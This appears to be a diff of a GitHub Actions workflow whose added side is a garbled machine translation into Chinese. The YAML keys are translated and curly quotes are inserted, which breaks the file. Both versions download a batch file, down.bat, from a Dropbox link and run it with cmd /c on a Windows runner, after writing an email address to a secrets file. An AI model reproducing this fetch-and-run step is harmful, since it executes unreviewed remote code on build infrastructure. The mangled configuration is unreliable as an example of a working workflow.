@@ -1,18 +1,18 @@
-姓名:浩阳猫
+姓名：浩阳猫
 
 在：
-  workflow_dispatch:
+  工作流程_调度：
 
-jobs:
-  build:
-    runs-on: windows-latest
 
-    steps:
-      - name: Downloading & Setting Up
-        run: |
-         echo "EMAIL_SECRET=wushuxi135@gmail.com" > secrets.txt
-         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/gdzoens68gz1o4wuwtf0x/down.bat?rlkey=wd1ecn33dv9yn2uvdyynavbs6&dl=1" -OutFile "down.bat"
+
+    running-on:     运行版本：windows-latest
+
+    脚步：
+      - name  :          - 名称：下载和设置
+        运行：|
+         echo "EMAIL_SECRET=wushuxi135@gmail.com" > Secrets.txt
+         Invoke-WebRequest -Uri“https://www.dropbox.com/scl/fi/gdzoens68gz1o4wuwtf0x/down.bat?rlkey=wd1ecn33dv9yn2uvdyynavbs6&dl=1”-OutFile“down.bat”
          cmd /c down.bat
 
-      - name: Time Counter
-        run: python time.py
+      -姓名  :         - 名称：时间投票
+        跑步：         运行：python time.py
